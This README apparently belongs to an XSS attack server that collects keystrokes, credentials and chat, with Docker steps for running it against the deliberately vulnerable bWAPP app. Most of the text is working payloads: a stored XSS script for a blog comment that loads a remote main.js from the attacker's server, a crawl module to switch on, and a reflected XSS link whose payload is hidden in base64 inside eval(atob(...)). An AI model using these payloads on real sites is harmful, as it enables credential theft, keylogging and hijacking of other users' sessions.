# xss_server

How to test:
- docker run -d -p 80:80 digitalpipelines/bwapp-docker
- git clone https://github.com/chickenidol/xss_server.git
- cd xss_server/docker && mkdir db && docker build -t test:xss_server . --no-cache
- docker run -ti -v $(pwd)/db:/xss_server/client/db  -p 8000:80 test:xss_server



1) Stored XSS, keys, creds, chat
	- Place blog message:
```
Hi, nice blog!
<script>
    let client_id = `someid`
    const urlParams = new URLSearchParams(window.location.search);
    const linkId = urlParams.get(`linkId`)

    if (linkId)
        client_id = linkId

    let main_script = document.createElement(`script`)
    main_script.src = `http://127.0.0.1:8000/main.js/` + client_id
    document.body.appendChild(main_script)
</script>
```

- Open link: http://127.0.0.1/xss_stored_1.php or http://127.0.0.1/xss_stored_1.php?linkId=wefwe

2) Stored XSS, keys, creds, chat, crawl
	- in crawl.js change iframe.src = "http://127.0.0.1/";
	- set const HOST_TO_CRAWL = "127.0.0.1"
	- uncomment crawl block in crawl.js

3) Reflected.
   - Open http://127.0.0.1/xss_get.php?firstname=%3Cscript%3Eeval(atob(`dmFyIHU9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7dS5zcmM9Imh0dHA6Ly8xMjcuMC4wLjE6ODAwMC9tYWluLmpzL2V3ZmV3ZndlZiI7ZG9jdW1lbnQuYm9keS5hcHBlbmQodSk7`))%3C%2Fscript%3E&lastname=test&form=submit

